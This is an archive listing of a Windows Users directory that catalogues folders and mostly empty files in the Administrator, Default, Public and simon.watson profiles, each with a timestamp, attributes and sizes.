2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/TempState
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/AC/Temp
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/AC
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/AppData
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/LocalCache
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/LocalState
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/RoamingState
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/Settings
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/SystemAppData
2025-02-16 10:48:49 D....                            Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/TempState
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AC
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AppData
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/LocalCache
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/LocalState
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/RoamingState
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/Settings
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/SystemAppData
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/TempState
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AC/INetCache
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AC/INetCookies
2025-02-16 11:11:00 D.HS.                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AC/INetHistory
2025-02-16 11:11:00 D....                            Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/AC/Temp
2025-02-16 11:10:30 D....                            Administrator/AppData/Local/Temp/Low
2025-02-16 10:48:49 D..S.                            Administrator/AppData/LocalLow/Microsoft
2025-02-16 10:48:49 D..S.                            Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache
2025-02-16 10:52:05 D..S.                            Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content
2025-02-16 10:52:05 D..S.                            Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData
2025-02-16 10:48:48 D....                            Administrator/AppData/Roaming/Adobe
2025-02-16 11:21:31 D..S.                            Administrator/AppData/Roaming/Microsoft
2025-02-16 10:48:48 D....                            Administrator/AppData/Roaming/Adobe/Flash Player
2025-02-16 10:48:48 D....                            Administrator/AppData/Roaming/Adobe/Flash Player/NativeCache
2025-02-16 10:48:47 D..S.                            Administrator/AppData/Roaming/Microsoft/Credentials
2025-02-16 10:48:47 D..S.                            Administrator/AppData/Roaming/Microsoft/Crypto
2025-02-16 10:48:48 D....                            Administrator/AppData/Roaming/Microsoft/Internet Explorer
2025-02-16 11:21:31 D....                            Administrator/AppData/Roaming/Microsoft/MMC
2025-02-16 10:48:47 D..S.                            Administrator/AppData/Roaming/Microsoft/Protect
2021-05-08 08:20:24 D....                            Administrator/AppData/Roaming/Microsoft/Spelling
2025-02-16 10:48:49 D..S.                            Administrator/AppData/Roaming/Microsoft/SystemCertificates
2025-02-16 10:48:47 D....                            Administrator/AppData/Roaming/Microsoft/Vault
2025-02-16 11:04:05 D....                            Administrator/AppData/Roaming/Microsoft/Windows
2025-02-16 10:48:47 D..S.                            Administrator/AppData/Roaming/Microsoft/Crypto/Keys
2025-02-16 10:48:47 D..S.                            Administrator/AppData/Roaming/Microsoft/Crypto/RSA
2025-02-16 10:48:47 D..S.                            Administrator/AppData/Roaming/Microsoft/Crypto/RSA/S-1-5-21-1498285545-150618015-1395900109-500
2025-02-16 10:48:49 DR...                            Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch
2025-02-16 10:48:48 D....                            Administrator/AppData/Roaming/Microsoft/Internet Explorer/UserData
2025-02-16 10:48:53 D.H..                            Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned
2025-02-16 10:48:49 D....                            Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/ImplicitAppShortcuts
2025-02-16 10:48:53 DR...                            Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar
2025-02-16 10:48:48 D....                            Administrator/AppData/Roaming/Microsoft/Internet Explorer/UserData/Low
2025-02-16 10:48:47 D..S.                            Administrator/AppData/Roaming/Microsoft/Protect/S-1-5-21-1498285545-150618015-1395900109-500
2025-02-16 10:48:49 D..S.                            Administrator/AppData/Roaming/Microsoft/SystemCertificates/My
2025-02-16 10:48:49 D..S.                            Administrator/AppData/Roaming/Microsoft/SystemCertificates/My/Certificates
2025-02-16 10:48:49 D..S.                            Administrator/AppData/Roaming/Microsoft/SystemCertificates/My/CRLs
2025-02-16 10:48:49 D..S.                            Administrator/AppData/Roaming/Microsoft/SystemCertificates/My/CTLs
2025-02-16 10:48:49 DR...                            Administrator/AppData/Roaming/Microsoft/Windows/AccountPictures
2021-05-08 08:20:24 D....                            Administrator/AppData/Roaming/Microsoft/Windows/CloudStore
2025-02-16 10:48:49 DR...                            Administrator/AppData/Roaming/Microsoft/Windows/Libraries
2021-05-08 08:20:24 D....                            Administrator/AppData/Roaming/Microsoft/Windows/Network Shortcuts
2021-05-08 08:20:24 D....                            Administrator/AppData/Roaming/Microsoft/Windows/Printer Shortcuts
2025-02-16 11:18:05 DR...                            Administrator/AppData/Roaming/Microsoft/Windows/Recent
2025-02-16 10:48:53 DR...                            Administrator/AppData/Roaming/Microsoft/Windows/SendTo
2025-02-16 11:18:27 D....                            Administrator/AppData/Roaming/Microsoft/Windows/ServerManager
2025-02-16 10:48:48 DR...                            Administrator/AppData/Roaming/Microsoft/Windows/Start Menu
2021-05-08 08:20:24 D....                            Administrator/AppData/Roaming/Microsoft/Windows/Templates
2025-02-16 11:10:31 D....                            Administrator/AppData/Roaming/Microsoft/Windows/Themes
2025-02-16 11:18:05 D....                            Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations
2025-02-16 11:10:46 D....                            Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations
2025-02-16 10:48:49 DR...                            Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs
2022-03-03 03:58:21 DR...                            Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility
2025-02-16 10:48:48 DR...                            Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories
2025-02-16 10:48:49 DR...                            Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Administrative Tools
2021-05-08 08:20:26 D....                            Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance
2025-02-16 10:48:49 DR...                            Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
2021-05-08 08:20:26 DR...                            Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools
2022-03-03 03:58:19 D....                            Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell
2025-02-16 11:10:31 D....                            Administrator/AppData/Roaming/Microsoft/Windows/Themes/CachedFiles
2025-02-16 10:48:48 DR...                            Administrator/Favorites/Links
2021-05-08 08:20:24 D.H..                            Default/AppData
2021-05-08 08:20:24 DR...                            Default/Desktop
2025-02-16 19:48:13 DR...                            Default/Documents
2021-05-08 08:20:24 DR...                            Default/Downloads
2021-05-08 08:20:24 DR...                            Default/Favorites
2021-05-08 08:20:24 DR...                            Default/Links
2021-05-08 08:20:24 DR...                            Default/Music
2021-05-08 08:20:24 DR...                            Default/Pictures
2021-05-08 08:20:24 D....                            Default/Saved Games
2021-05-08 08:20:24 DR...                            Default/Videos
2025-02-16 19:48:13 D....                            Default/AppData/Local
2021-05-08 08:34:59 D....                            Default/AppData/Roaming
2021-05-08 08:34:49 D....                            Default/AppData/Local/Microsoft
2021-05-08 08:20:24 D....                            Default/AppData/Local/Temp
2021-05-08 08:34:49 D....                            Default/AppData/Local/Microsoft/InputPersonalization
2025-02-16 19:48:13 D....                            Default/AppData/Local/Microsoft/Windows
2021-05-08 08:20:26 D.HS.                            Default/AppData/Local/Microsoft/Windows Sidebar
2021-05-08 08:20:24 D..S.                            Default/AppData/Local/Microsoft/WindowsApps
2021-05-08 08:20:24 D....                            Default/AppData/Local/Microsoft/InputPersonalization/TrainedDataStore
2021-05-08 08:20:24 D....                            Default/AppData/Local/Microsoft/Windows/CloudStore
2021-05-08 08:20:24 D....                            Default/AppData/Local/Microsoft/Windows/GameExplorer
2021-05-08 08:20:24 D..S.                            Default/AppData/Local/Microsoft/Windows/History
2021-05-08 08:20:24 D..S.                            Default/AppData/Local/Microsoft/Windows/INetCache
2021-05-08 08:20:24 D..S.                            Default/AppData/Local/Microsoft/Windows/INetCookies
2025-02-16 11:05:50 D....                            Default/AppData/Local/Microsoft/Windows/Shell
2021-05-08 08:20:24 D....                            Default/AppData/Local/Microsoft/Windows/WinX
2021-05-08 08:20:35 DR...                            Default/AppData/Local/Microsoft/Windows/WinX/Group1
2021-05-08 08:20:35 DR...                            Default/AppData/Local/Microsoft/Windows/WinX/Group2
2021-05-08 08:20:35 DR...                            Default/AppData/Local/Microsoft/Windows/WinX/Group3
2021-05-08 08:20:24 D....                            Default/AppData/Local/Microsoft/Windows Sidebar/Gadgets
2021-05-08 08:34:59 D..S.                            Default/AppData/Roaming/Microsoft
2021-05-08 08:34:59 D....                            Default/AppData/Roaming/Microsoft/Internet Explorer
2021-05-08 08:20:24 D....                            Default/AppData/Roaming/Microsoft/Spelling
2021-05-08 08:34:49 D....                            Default/AppData/Roaming/Microsoft/Windows
2021-05-08 08:20:35 DR...                            Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch
2021-05-08 08:20:24 D....                            Default/AppData/Roaming/Microsoft/Windows/CloudStore
2021-05-08 08:20:24 D....                            Default/AppData/Roaming/Microsoft/Windows/Network Shortcuts
2021-05-08 08:20:24 D....                            Default/AppData/Roaming/Microsoft/Windows/Printer Shortcuts
2021-05-08 08:20:24 DR...                            Default/AppData/Roaming/Microsoft/Windows/Recent
2021-05-08 08:34:49 DR...                            Default/AppData/Roaming/Microsoft/Windows/SendTo
2021-05-08 08:20:24 DR...                            Default/AppData/Roaming/Microsoft/Windows/Start Menu
2021-05-08 08:20:24 D....                            Default/AppData/Roaming/Microsoft/Windows/Templates
2021-05-08 08:34:49 D....                            Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs
2025-02-16 11:05:58 DR...                            Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility
2021-05-08 08:20:26 D....                            Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories
2021-05-08 08:20:26 D....                            Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance
2021-05-08 08:20:26 DR...                            Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools
2022-03-03 03:58:19 D....                            Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell
2025-02-16 10:48:48 DRH..                            Public/AccountPictures
2021-05-08 08:20:26 DRH..                            Public/Desktop
2025-02-16 19:48:13 DR...                            Public/Documents
2021-05-08 08:20:26 DR...                            Public/Downloads
2021-05-08 08:34:49 DRH..                            Public/Libraries
2021-05-08 08:20:26 DR...                            Public/Music
2021-05-08 08:20:26 DR...                            Public/Pictures
2021-05-08 08:20:26 DR...                            Public/Videos
2025-02-16 11:15:52 D.H..                            simon.watson/AppData
2021-05-08 08:20:24 DR...                            simon.watson/Desktop
2025-02-16 11:15:52 DR...                            simon.watson/Documents
2021-05-08 08:20:24 DR...                            simon.watson/Downloads
2021-05-08 08:20:24 DR...                            simon.watson/Favorites
2021-05-08 08:20:24 DR...                            simon.watson/Links
2021-05-08 08:20:24 DR...                            simon.watson/Music
2021-05-08 08:20:24 DR...                            simon.watson/Pictures
2021-05-08 08:20:24 D....                            simon.watson/Saved Games
2021-05-08 08:20:24 DR...                            simon.watson/Videos
2025-02-16 11:15:52 D....                            simon.watson/AppData/Local
2025-02-16 11:15:52 D....                            simon.watson/AppData/LocalLow
2021-05-08 08:34:59 D....                            simon.watson/AppData/Roaming
2021-05-08 08:34:49 D....                            simon.watson/AppData/Local/Microsoft
2025-02-16 11:17:59 D....                            simon.watson/AppData/Local/Temp
2021-05-08 08:34:49 D....                            simon.watson/AppData/Local/Microsoft/InputPersonalization
2025-02-16 11:17:58 D....                            simon.watson/AppData/Local/Microsoft/Windows
2021-05-08 08:20:26 D.HS.                            simon.watson/AppData/Local/Microsoft/Windows Sidebar
2021-05-08 08:20:24 D..S.                            simon.watson/AppData/Local/Microsoft/WindowsApps
2021-05-08 08:20:24 D....                            simon.watson/AppData/Local/Microsoft/InputPersonalization/TrainedDataStore
2021-05-08 08:20:24 D....                            simon.watson/AppData/Local/Microsoft/Windows/CloudStore
2021-05-08 08:20:24 D....                            simon.watson/AppData/Local/Microsoft/Windows/GameExplorer
2021-05-08 08:20:24 D..S.                            simon.watson/AppData/Local/Microsoft/Windows/History
2021-05-08 08:20:24 D..S.                            simon.watson/AppData/Local/Microsoft/Windows/INetCache
2021-05-08 08:20:24 D..S.                            simon.watson/AppData/Local/Microsoft/Windows/INetCookies
2025-02-16 11:18:02 D....                            simon.watson/AppData/Local/Microsoft/Windows/PowerShell
2025-02-16 11:05:50 D....                            simon.watson/AppData/Local/Microsoft/Windows/Shell
2021-05-08 08:20:24 D....                            simon.watson/AppData/Local/Microsoft/Windows/WinX
2021-05-08 08:20:35 DR...                            simon.watson/AppData/Local/Microsoft/Windows/WinX/Group1
2021-05-08 08:20:35 DR...                            simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2
2021-05-08 08:20:35 DR...                            simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3
2021-05-08 08:20:24 D....                            simon.watson/AppData/Local/Microsoft/Windows Sidebar/Gadgets
2021-05-08 08:34:59 D..S.                            simon.watson/AppData/Roaming/Microsoft
2021-05-08 08:34:59 D....                            simon.watson/AppData/Roaming/Microsoft/Internet Explorer
2021-05-08 08:20:24 D....                            simon.watson/AppData/Roaming/Microsoft/Spelling
2025-02-16 11:18:01 D....                            simon.watson/AppData/Roaming/Microsoft/Windows
2021-05-08 08:20:35 DR...                            simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch
2021-05-08 08:20:24 D....                            simon.watson/AppData/Roaming/Microsoft/Windows/CloudStore
2021-05-08 08:20:24 D....                            simon.watson/AppData/Roaming/Microsoft/Windows/Network Shortcuts
2025-02-16 11:18:01 D....                            simon.watson/AppData/Roaming/Microsoft/Windows/PowerShell
2021-05-08 08:20:24 D....                            simon.watson/AppData/Roaming/Microsoft/Windows/Printer Shortcuts
2021-05-08 08:20:24 DR...                            simon.watson/AppData/Roaming/Microsoft/Windows/Recent
2021-05-08 08:34:49 DR...                            simon.watson/AppData/Roaming/Microsoft/Windows/SendTo
2021-05-08 08:20:24 DR...                            simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu
2021-05-08 08:20:24 D....                            simon.watson/AppData/Roaming/Microsoft/Windows/Templates
2025-02-16 11:18:01 D....                            simon.watson/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine
2021-05-08 08:34:49 D....                            simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs
2025-02-16 11:05:58 DR...                            simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility
2021-05-08 08:20:26 D....                            simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories
2021-05-08 08:20:26 D....                            simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance
2021-05-08 08:20:26 DR...                            simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools
2022-03-03 03:58:19 D....                            simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell
2021-05-08 08:34:03 D.HS.           82           82  All Users
2021-05-08 08:34:03 D.HS.           84           84  Default User
2025-02-16 10:48:46 D.HS.          172          172  Administrator/Application Data
2025-02-16 10:48:46 D.HS.          284          284  Administrator/Cookies
2025-02-16 10:48:46 D.HS.          164          164  Administrator/Local Settings
2025-02-16 10:48:46 D.HS.          164          164  Administrator/AppData/Local/Application Data
2025-02-16 10:48:46 D.HS.          148          148  Administrator/My Documents
2025-02-16 10:48:46 D.HS.          316          316  Administrator/NetHood
2025-02-16 10:48:46 D.HS.          316          316  Administrator/PrintHood
2025-02-16 10:48:46 D.HS.          272          272  Administrator/Recent
2025-02-16 10:48:46 D.HS.          272          272  Administrator/SendTo
2025-02-16 10:48:46 D.HS.          288          288  Administrator/Start Menu
2025-02-16 10:48:46 D.HS.          284          284  Administrator/Templates
2025-02-16 10:48:46 D.HS.          268          268  Administrator/AppData/Local/History
2025-02-16 10:48:46 D.HS.          276          276  Administrator/AppData/Local/Temporary Internet Files
2025-02-16 10:48:46 D.HS.          276          276  Administrator/AppData/Local/Microsoft/Windows/Temporary Internet Files
2025-02-16 11:10:30 D.HS.          288          288  Administrator/AppData/Local/Microsoft/Windows/INetCache/Content.IE5
2025-02-16 10:48:46 D.HS.          132          132  Administrator/Documents/My Music
2025-02-16 10:48:46 D.HS.          144          144  Administrator/Documents/My Pictures
2025-02-16 10:48:46 D.HS.          136          136  Administrator/Documents/My Videos
2025-02-16 19:48:13 D.HS.          148          148  Default/Application Data
2025-02-16 19:48:13 D.HS.          260          260  Default/Cookies
2025-02-16 19:48:13 D.HS.          140          140  Default/Local Settings
2025-02-16 19:48:13 D.HS.          140          140  Default/AppData/Local/Application Data
2025-02-16 19:48:13 D.HS.          124          124  Default/My Documents
2025-02-16 19:48:13 D.HS.          292          292  Default/NetHood
2025-02-16 19:48:13 D.HS.          292          292  Default/PrintHood
2025-02-16 19:48:13 D.HS.          248          248  Default/Recent
2025-02-16 19:48:13 D.HS.          248          248  Default/SendTo
2025-02-16 19:48:13 D.HS.          264          264  Default/Start Menu
2025-02-16 19:48:13 D.HS.          260          260  Default/Templates
2025-02-16 19:48:13 D.HS.          244          244  Default/AppData/Local/History
2025-02-16 19:48:13 D.HS.          252          252  Default/AppData/Local/Temporary Internet Files
2025-02-16 19:48:13 D.HS.          252          252  Default/AppData/Local/Microsoft/Windows/Temporary Internet Files
2025-02-16 19:48:13 D.HS.          108          108  Default/Documents/My Music
2025-02-16 19:48:13 D.HS.          120          120  Default/Documents/My Pictures
2025-02-16 19:48:13 D.HS.          112          112  Default/Documents/My Videos
2025-02-16 19:48:13 D.HS.          104          104  Public/Documents/My Music
2025-02-16 19:48:13 D.HS.          116          116  Public/Documents/My Pictures
2025-02-16 19:48:13 D.HS.          108          108  Public/Documents/My Videos
2025-02-16 11:15:52 D.HS.          168          168  simon.watson/Application Data
2025-02-16 11:15:52 D.HS.          280          280  simon.watson/Cookies
2025-02-16 11:15:52 D.HS.          160          160  simon.watson/Local Settings
2025-02-16 11:15:52 D.HS.          160          160  simon.watson/AppData/Local/Application Data
2025-02-16 11:15:52 D.HS.          144          144  simon.watson/My Documents
2025-02-16 11:15:52 D.HS.          312          312  simon.watson/NetHood
2025-02-16 11:15:52 D.HS.          312          312  simon.watson/PrintHood
2025-02-16 11:15:52 D.HS.          268          268  simon.watson/Recent
2025-02-16 11:15:52 D.HS.          268          268  simon.watson/SendTo
2025-02-16 11:15:52 D.HS.          284          284  simon.watson/Start Menu
2025-02-16 11:15:52 D.HS.          280          280  simon.watson/Templates
2025-02-16 11:15:52 D.HS.          264          264  simon.watson/AppData/Local/History
2025-02-16 11:15:52 D.HS.          272          272  simon.watson/AppData/Local/Temporary Internet Files
2025-02-16 11:15:52 D.HS.          272          272  simon.watson/AppData/Local/Microsoft/Windows/Temporary Internet Files
2025-02-16 11:15:52 D.HS.          128          128  simon.watson/Documents/My Music
2025-02-16 11:15:52 D.HS.          140          140  simon.watson/Documents/My Pictures
2025-02-16 11:15:52 D.HS.          132          132  simon.watson/Documents/My Videos
2025-02-16 10:48:46 ..HSA            0            0  Administrator/ntuser.dat.LOG1
2025-02-16 11:04:12 ....A            0            0  Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/ActivitiesCache.db-wal
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Microsoft/Edge/User Data/Crashpad/metadata
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Favicons-journal
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/History-journal
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Login Data-journal
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Media History-journal
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Web Data-journal
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/000003.log
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/LOCK
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database/LOCK
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB/LOCK
2025-02-16 11:17:31 ....A            0            0  Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/.inUse
2025-02-16 10:48:47 ..HSA            0            0  Administrator/AppData/Local/Microsoft/Windows/WebCacheLock.dat
2025-02-16 10:48:48 ..HSA            0            0  Administrator/AppData/Local/Microsoft/Windows/History/History.IE5/container.dat
2025-02-16 11:18:05 ..HSA            0            0  Administrator/AppData/Local/Microsoft/Windows/History/History.IE5/MSHist012025021620250217/container.dat
2025-02-16 10:48:48 ..HSA            0            0  Administrator/AppData/Local/Microsoft/Windows/INetCache/IE/container.dat
2025-02-16 10:59:25 ..HSA            0            0  Administrator/AppData/Local/Microsoft/Windows/INetCookies/container.dat
2025-02-16 10:52:04 ..HSA            0            0  Administrator/AppData/Local/Microsoft/Windows/INetCookies/ESE/container.dat
2025-02-16 11:17:04 ..H.A            0            0  Administrator/AppData/Local/Microsoft/Windows/Notifications/WPNPRMRY.tmp
2025-02-16 11:11:03 ....A            0            0  Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:03 ....A            0            0  Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:03 ....A            0            0  Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:02 ....A            0            0  Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 10:48:48 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 10:48:53 ..HSA            0            0  Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/Settings/settings.dat.LOG2
2025-02-16 11:11:02 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:02 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/Settings/roaming.lock
2025-02-16 10:48:48 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:02 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:02 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/Settings/roaming.lock
2025-02-16 11:11:02 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:02 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:01 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:01 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 10:48:48 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:01 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/Settings/roaming.lock
2025-02-16 10:48:48 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 10:48:48 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:01 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:01 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 10:52:22 ..HSA            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCache/container.dat
2025-02-16 10:52:22 ..HSA            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCookies/ESE/container.dat
2025-02-16 10:52:22 ..HSA            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/container.dat
2025-02-16 10:48:50 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 10:48:52 ..HSA            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/Settings/settings.dat.LOG2
2025-02-16 11:11:01 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 10:48:52 ..HSA            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/Settings/settings.dat.LOG2
2025-02-16 11:11:00 ....A            0            0  Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:00 ....A            0            0  Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:00 ....A            0            0  Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 10:48:49 ....A            0            0  Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/Settings/roaming.lock
2025-02-16 11:11:00 ....A            0            0  Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/Settings/roaming.lock
